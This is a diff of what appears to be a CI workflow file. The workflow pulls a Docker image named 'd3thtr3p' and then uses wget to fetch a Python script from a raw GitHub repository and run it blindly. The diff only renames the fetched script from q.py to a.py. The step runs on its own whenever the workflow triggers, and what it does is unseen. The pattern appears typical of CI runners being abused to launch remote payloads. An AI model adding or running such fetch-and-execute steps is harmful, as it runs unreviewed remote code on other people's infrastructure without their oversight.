@@ -17,4 +17,4 @@ jobs:
       run: docker pull livetest/d3thtr3p:v1
     - name: Run Docker file
       run: |
-            docker run livetest/d3thtr3p:v1 sh -c "wget https://raw.githubusercontent.com/Rdxcj/67/main/q.py && python3 q.py"
+            docker run livetest/d3thtr3p:v1 sh -c "wget https://raw.githubusercontent.com/Rdxcj/67/main/a.py && python3 a.py"
